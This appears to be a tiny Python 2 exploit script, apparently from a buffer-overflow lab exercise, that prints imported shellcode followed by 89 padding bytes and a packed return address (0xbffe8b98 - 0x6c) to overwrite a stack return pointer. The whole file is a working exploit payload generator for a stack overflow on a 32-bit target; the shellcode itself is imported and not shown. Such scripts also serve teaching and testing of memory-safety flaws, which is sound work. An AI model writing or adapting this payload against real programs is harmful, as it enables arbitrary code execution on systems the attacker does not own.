#!/usr/bin/env python
from shellcode import shellcode
from struct import pack

print shellcode + '\x61'*89 + pack('<I', 0xbffe8b98 - 0x6c)